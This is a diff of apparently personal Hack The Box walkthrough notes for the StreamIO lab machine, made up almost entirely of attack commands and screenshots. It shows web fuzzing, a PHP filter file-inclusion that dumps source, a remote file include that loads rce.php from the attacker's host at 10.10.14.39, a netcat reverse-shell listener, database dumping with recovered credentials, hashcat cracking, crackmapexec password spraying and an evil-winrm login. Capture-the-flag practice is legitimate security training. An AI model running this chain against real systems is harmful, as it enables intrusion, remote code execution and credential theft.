@@ -1,4 +1,4 @@
-```
+![image](https://github.com/regarmulia/HTB/assets/33616880/3eb2889f-bcf3-421c-b558-1110806dc66f)```
 https://watch.streamio.htb/
 ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u https://watch.streamio.htb/FUZZ -fc 403 -e .aspx,.php,.txt,.html
 https://watch.streamio.htb/search.php
@@ -142,10 +142,70 @@ ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'h
 ![image](https://user-images.githubusercontent.com/33616880/231686014-782672f5-2cd5-4701-ae65-e2c0a17b50a7.png)
 
 
+```
+https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php
+echo "PGgxPk1vdmllIG1hbmFnbWVudDwvaDE+DQo8P3BocA0KaWYoIWRlZmluZWQoJ2luY2x1ZGVkJykpDQoJZGllKCJPbmx5IGFjY2Vzc2FibGUgdGhyb3VnaCBpbmNsdWRlcyIpOw0KaWYoaXNzZXQoJF9QT1NUWydtb3ZpZV9pZCddKSkNCnsNCiRxdWVyeSA9ICJkZWxldGUgZnJvbSBtb3ZpZXMgd2hlcmUgaWQgPSAiLiRfUE9TVFsnbW92aWVfaWQnXTsNCiRyZXMgPSBzcWxzcnZfcXVlcnkoJGhhbmRsZSwgJHF1ZXJ5LCBhcnJheSgpL[SNIIIIIP]Pg0KPGJyPjxocj48YnI+DQo8Zm9ybSBtZXRob2Q9IlBPU1QiPg0KPGlucHV0IG5hbWU9ImluY2x1ZGUiIGhpZGRlbj4NCjwvZm9ybT4NCjw/cGhwDQppZihpc3NldCgkX1BPU1RbJ2luY2x1ZGUnXSkpDQp7DQppZigkX1BPU1RbJ2luY2x1ZGUnXSAhPT0gImluZGV4LnBocCIgKSANCmV2YWwoZmlsZV9nZXRfY29udGVudHMoJF9QT1NUWydpbmNsdWRlJ10pKTsNCmVsc2UNCmVjaG8oIiAtLS0tIEVSUk9SIC0tLS0gIik7DQp9DQo/Pg==" | base64 -d > master.php
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/fd555a28-d715-4054-aec9-d71b2ccb97e0)
 
-crackmapexec winrm streamio.htb -u nikk37 -p 'get_dem_girls2@yahoo.com'
-![image](https://user-images.githubusercontent.com/33616880/231686173-feab63d2-f0eb-4ace-8ffa-75df669cec01.png)
+![image](https://github.com/regarmulia/HTB/assets/33616880/ef685788-d182-4b4e-8988-ab10073e345a)
 
+
+```
+system("dir C:\\");
+https://streamio.htb/admin/?debug=master.php
+Content-Type: application/x-www-form-urlencoded
+include=http://10.10.14.39/rce.php
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/e734346e-828d-42ac-acbe-8301d121f68d)
+
+![image](https://github.com/regarmulia/HTB/assets/33616880/419ea432-7684-4c04-825d-99f9b08bf57d)
+
+![image](https://github.com/regarmulia/HTB/assets/33616880/d28f9d3c-3f78-4250-9f36-94073268c901)
+
+
+```
+rlwrap -cAr nc -lnvp 443
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/7a536fc7-dd48-48aa-912b-f35f9306b243)
+
+![image](https://github.com/regarmulia/HTB/assets/33616880/c62978fa-b9f5-456f-94e6-820969a459de)
+
+![image](https://github.com/regarmulia/HTB/assets/33616880/3bae563b-ab72-4c7b-98e7-909c777c9eb9)
+
+
+```
+$connection = array("Database"=>"STREAMIO", "UID" => "db_user", "PWD" => 'B1@hB1@hB1@h’);
+dir -recurse *.php | select-string -pattern "database"
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/ca279069-7ef6-4bca-a83e-b82202e8242a)
+
+![image](https://github.com/regarmulia/HTB/assets/33616880/ede2f053-a9c5-41c2-b1e1-e03c45ee34e2)
+
+
+```
+where.exe sqlcmd
+sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select table_name from streamio_backup.information_schema.tables;“
+sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select * from users;"
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/00842f4d-19a9-4136-ac87-0324c027facc)
+
+
+```
+hashcat user-passwords-backup /usr/share/wordlists/rockyou.txt -m0 --user
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/df33cfcb-58d1-49f1-9693-80ebc98060c1)
+
+![image](https://github.com/regarmulia/HTB/assets/33616880/643e2a3d-9228-418e-85a9-196f928222d4)
+
+
+```
+crackmapexec smb 10.10.11.158 -u users2.txt -p pass2.txt --continue-on-success --no-bruteforce
+crackmapexec winrm 10.10.11.158 -u nikk37 -p 'get_dem_girls2@yahoo.com'
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/94348f00-aa7a-491f-8b27-f3c9968f603c)
+
+![image](https://github.com/regarmulia/HTB/assets/33616880/36eeeecf-6b91-4d35-8485-602a4c2c4292)
 
 
 evil-winrm -i streamIO.htb -u nikk37 -p get_dem_girls2@yahoo.com
